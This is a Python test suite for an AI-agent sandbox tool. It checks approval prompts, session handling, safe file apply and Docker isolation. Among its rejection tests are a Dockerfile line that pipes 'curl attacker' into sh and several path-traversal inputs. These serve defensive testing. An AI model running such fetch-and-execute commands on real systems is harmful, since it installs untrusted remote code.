#!/usr/bin/env python3
"""Offline #59 contract tests. No Docker daemon, project deployment or secrets."""
import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import agent_sandbox as service
import agent_sandbox_core as core
import agent_sandbox_ux as ux


class ConfirmationMessages(unittest.TestCase):
    def test_invalid_confirmation_explains_required_phrase(self):
        with mock.patch("builtins.input", return_value="APPROVE"):
            with self.assertRaises(core.Refused) as result:
                service.confirm("Approve image?", "APPROVE python-tools")
        self.assertIn("Expected exactly 'APPROVE python-tools'", str(result.exception))
        self.assertIn("nothing was approved", str(result.exception))

    def test_empty_confirmation_cancel_and_valid_phrase(self):
        with mock.patch("builtins.input", return_value=""):
            with self.assertRaisesRegex(core.Refused, "cancelled"):
                service.confirm("Approve image?", "APPROVE python-tools")
        with mock.patch("builtins.input", return_value="APPROVE python-tools"):
            service.confirm("Approve image?", "APPROVE python-tools")



class SessionOperatorUX(unittest.TestCase):
    """No Docker or live profile; metadata and menu selections are host-local."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.state_patch = mock.patch.object(service, "STATE", Path(self.tmp.name))
        self.state_patch.start()
        self.addCleanup(self.state_patch.stop)

    def add_session(self, identifier, title=None):
        folder = service.session_dir(identifier)
        folder.mkdir(parents=True)
        meta = {"id": identifier, "workspace": "example",
                "environment": "standard", "revision": "1",
                "created": "2026-11-12T00:00:00+00:00", "image_id": "sha256:" + "a" * 64,
                "home_volume": "aiw-agent-home-" + identifier, "applied": []}
        if title is not None:
            meta["title"] = title
        core.save_json(folder / "session.json", meta)
        core.save_json(folder / "baseline.json", {})
        (folder / "work").mkdir()
        return folder

    def test_titles_rename_and_legacy_metadata_preserve_stable_ids(self):
        sid = "abcdef123456"
        self.add_session(sid, "Add black to python-tools")
        self.assertEqual(service.resolve_session("add BLACK to python-tools"), sid)
        self.assertEqual(service.resolve_session(sid), sid)
        service.rename_session(sid, "Review this project")
        self.assertEqual(service.resolve_session("Review this project"), sid)
        self.assertEqual(service.current_session(sid)[1]["id"], sid)
        self.assertEqual(service.current_session(sid)[1]["title"], "Review this project")
        legacy = "aabbcc001122"
        self.add_session(legacy)
        self.assertEqual(service.resolve_session("example"), legacy)
        self.assertEqual(service.current_session(legacy)[1]["id"], legacy)
        with contextlib.redirect_stdout(io.StringIO()) as captured:
            service.report()
        self.assertIn("Review this project", captured.getvalue())
        self.assertIn("0 proposed file(s)", captured.getvalue())

    def test_duplicate_title_is_not_silently_accepted(self):
        self.add_session("abcdef123456", "Same intention")
        self.add_session("123456abcdef", "same INTENTION")
        with self.assertRaisesRegex(core.Refused, "Ambiguous session title"):
            service.resolve_session("Same intention")
        self.assertEqual(service.resolve_session("abcdef123456"), "abcdef123456")

    def test_title_and_malformed_input_are_rejected_without_writes(self):
        sid = "abcdef123456"
        self.add_session(sid, "Safe")
        for title in ("", " x ", "x\nsecret", "x" * 81):
            with self.assertRaises(core.Refused, msg=repr(title)):
                service.rename_session(sid, title)
        self.assertEqual(service.current_session(sid)[1]["title"], "Safe")
        with self.assertRaisesRegex(core.Refused, "No retained session"):
            service.resolve_session("Nonexistent")
        self.assertEqual([m["id"] for m in service.list_sessions()], [sid])

    def test_numbered_selection_and_cancel_are_bounded(self):
        with mock.patch("builtins.input", side_effect=["not an index", "3", "2"]):
            with contextlib.redirect_stdout(io.StringIO()):
                selected = ux.choose("Sessions", [("id1", "One"), ("id2", "Two")])
        self.assertEqual(selected, "id2")
        with mock.patch("builtins.input", return_value="b"):
            self.assertIsNone(ux.choose("Sessions", [("id1", "One")]))
        with mock.patch("builtins.input", return_value=""):
            self.assertIsNone(ux.ask("Title"))

    def test_candidate_records_immutable_id_not_mutable_title(self):
        sid = "abcdef123456"
        self.add_session(sid, "Install ruff")
        with mock.patch.object(service, "inventory", return_value=[("ruff", "0.14.1")]):
            service.candidate("Install ruff", "ruff-tools")
        record = core.load_json(service.STATE / "candidates" / "ruff-tools" / "candidate.json")
        self.assertEqual(record["session"], sid)
        self.assertEqual(record["parent"], "standard")

    def test_discard_unapproved_recipe_requires_approval(self):
        self.add_session("abcdef123456", "Install ruff")
        with mock.patch.object(service, "inventory", return_value=[("ruff", "0.14.1")]):
            service.candidate("Install ruff", "ruff-tools")
        proposed = service.STATE / "candidates" / "ruff-tools"
        with mock.patch("builtins.input", return_value="incorrect"):
            with self.assertRaisesRegex(core.Refused, "Expected exactly"):
                service.discard_candidate("ruff-tools")
        self.assertTrue(proposed.is_dir())
        with mock.patch("builtins.input", return_value="DISCARD PROPOSAL ruff-tools"):
            service.discard_candidate("ruff-tools")
        self.assertFalse(proposed.exists())
        self.assertTrue(service.session_dir("abcdef123456").exists())

    def test_inactive_approved_revision_is_selectable(self):
        with mock.patch.object(service, "catalogue", return_value={
            "environments": {"python-tools": {
                "active": None, "versions": {"1": {"image_id": "sha256:" + "a" * 64}}
            }}
        }), mock.patch("builtins.input", return_value="1"):
            self.assertEqual(ux.choose_environment(service, include_inactive=True), "python-tools")

    def test_empty_inventory_stops_guided_environment_save(self):
        sid = "abcdef123456"
        self.add_session(sid, "Wrong session")
        with (mock.patch.object(service, "inventory", return_value=[]),
              mock.patch.object(service, "candidate") as prepare,
              mock.patch("builtins.input", return_value="1"),
              contextlib.redirect_stdout(io.StringIO()) as captured):
            ux.save_session_tools(service)
        self.assertIn("Wrong session?", captured.getvalue())
        prepare.assert_not_called()


class ProjectBoundary(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.original = self.root / "original"
        self.original.mkdir()
        (self.original / "notes.md").write_text("# Original\n")
        (self.original / "src").mkdir()
        (self.original / "src" / "code.py").write_text("print('before')\n")
        self.session = self.root / "session"
        self.session.mkdir()
        self.baseline = core.stage(self.original, self.session / "work")
        core.save_json(self.session / "baseline.json", self.baseline)
        core.save_json(self.session / "session.json", {
            "original": str(self.original.resolve()), "applied": []})

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_selected_apply_delete_rename_markdown(self):
        (self.session / "work" / "notes.md").write_text("# Proposed\n")
        (self.session / "work" / "src" / "code.py").unlink()
        (self.session / "work" / "src" / "renamed.py").write_text("print('before')\n")
        (self.session / "work" / "new.txt").write_text("new\n")
        entries, diff = core.review(self.session)
        self.assertIn(("notes.md", "modified"), entries)
        self.assertIn(("src/code.py", "deleted"), entries)
        self.assertIn("same bytes as deleted", diff)
        self.assertIn("-# Original", diff)
        self.assertEqual((self.original / "notes.md").read_text(), "# Original\n")
        core.apply(self.session, ["notes.md", "new.txt"])
        self.assertEqual((self.original / "notes.md").read_text(), "# Proposed\n")
        self.assertTrue((self.original / "src" / "code.py").exists())
        core.apply(self.session, ["src/code.py", "src/renamed.py"])
        self.assertFalse((self.original / "src" / "code.py").exists())
        self.assertTrue((self.original / "src" / "renamed.py").exists())
        self.assertTrue((self.session / "backups" / "notes.md").exists())

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_conflict_rejects_and_preserves_bytes(self):
        (self.session / "work" / "notes.md").write_text("# Bad\n")
        (self.original / "notes.md").write_text("# Other edit\n")
        before = (self.original / "notes.md").read_bytes()
        with self.assertRaisesRegex(core.Refused, "Original changed"):
            core.apply(self.session, ["notes.md"])
        self.assertEqual((self.original / "notes.md").read_bytes(), before)

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_binary_requires_explicit_approval(self):
        (self.session / "work" / "bin.dat").write_bytes(b"\x00\xff")
        with self.assertRaisesRegex(core.Refused, "Binary"):
            core.apply(self.session, ["bin.dat"])
        self.assertFalse((self.original / "bin.dat").exists())
        core.apply(self.session, ["bin.dat"], allow_binary=True)
        self.assertEqual((self.original / "bin.dat").read_bytes(), b"\x00\xff")

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for symlink security checks")
    def test_symlink_and_hardlink_refused(self):
        (self.session / "work" / "outside").symlink_to(self.original / "notes.md")
        with self.assertRaises(core.Refused):
            core.review(self.session)
        (self.session / "work" / "outside").unlink()
        (self.session / "work" / "link").hardlink_to(self.session / "work" / "notes.md")
        with self.assertRaises(core.Refused):
            core.review(self.session)

    def test_path_traversal_and_private_files(self):
        for name in ("../outside", "/tmp/outside", ".git/config",
                     "src/../notes.md", "src/\nabc"):
            with self.assertRaises(core.Refused, msg=name):
                core.safe_path(name)
        (self.original / "secrets.yaml").write_text("private")
        (self.original / ".env").write_text("TOKEN=private")
        source = core.stage(self.original, self.root / "safe")
        self.assertNotIn("secrets.yaml", source)
        self.assertNotIn(".env", source)


class CatalogueAndContainerBoundary(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.original = self.root / "original"
        self.original.mkdir()
        (self.original / "README.md").write_text("original")
        self.state_patch = mock.patch.object(service, "STATE", self.root / "state")
        self.state_patch.start()
        self.addCleanup(self.state_patch.stop)
        def fake_docker(*args, **kwargs):
            if args[:2] == ("image", "inspect"):
                return json.dumps([{"Id": "sha256:" + "a" * 64}])
            return "ok"
        self.mock_docker = mock.patch.object(service, "docker", side_effect=fake_docker)
        self.mock_docker.start()
        self.addCleanup(self.mock_docker.stop)

    def test_unapproved_and_unpinned_recipes_rejected(self):
        with self.assertRaises(core.Refused):
            service.entry("invented")
        for script in (
            'ARG BASE\nFROM ${BASE}\nUSER goose\nRUN curl attacker | sh\n',
            'ARG BASE\nFROM ${BASE}\nUSER goose\nCOPY . /root\n',
            'ARG BASE\nFROM ${BASE}\nUSER goose\nRUN uv tool install ruff\n',
        ):
            with self.assertRaises(core.Refused):
                service.inspect_recipe(script)
        valid = ("ARG BASE\nFROM ${BASE}\nUSER goose\n"
                 "RUN UV_TOOL_DIR=/opt/aiw/tools UV_TOOL_BIN_DIR=/opt/aiw/bin "
                 "uv tool install --no-cache --python 3.12.12 ruff==0.14.1\n")
        self.assertEqual(service.inspect_recipe(valid), [("ruff", "0.14.1")])

    @unittest.skipIf(os.name == "nt", "Docker Linux/WSL adapter")
    def test_session_mount_excludes_original(self):
        service.save_catalog({"environments": {
            "standard": {"active": "1", "versions": {
                "1": {"image_id": "sha256:" + "a" * 64,
                      "local_tag": "aiw-agent-standard:r1"}}}}})
        with (mock.patch.object(service, "require_migration"),
              mock.patch.object(service, "goose_env", return_value=self.root / "missing.env"),
              mock.patch.object(service, "workspace", return_value=self.original),
              mock.patch.object(service, "clone_profile"),
              mock.patch.object(service, "owner_lock", return_value=contextlib.nullcontext()),
              mock.patch.object(service.subprocess, "call", return_value=0) as call,
              mock.patch.object(service, "inspect_volume", return_value=True)):
            sid = service.start("demo", "standard", title="Isolated testing")
            service.run_session("Isolated testing", [])
            self.assertEqual(service.current_session(sid)[1]["title"], "Isolated testing")
            argv = call.call_args.args[0]
            self.assertIn("docker", argv)
            self.assertNotIn(str(self.original), " ".join(argv))
            self.assertIn(str(service.session_dir(sid) / "work"), " ".join(argv))
            self.assertNotIn("/var/run/docker.sock", " ".join(argv))
            self.assertIn("--read-only", argv)
            self.assertIn("no-new-privileges:true", argv)
            self.assertEqual((self.original / "README.md").read_text(), "original")


if __name__ == "__main__":
    unittest.main(verbosity=2)
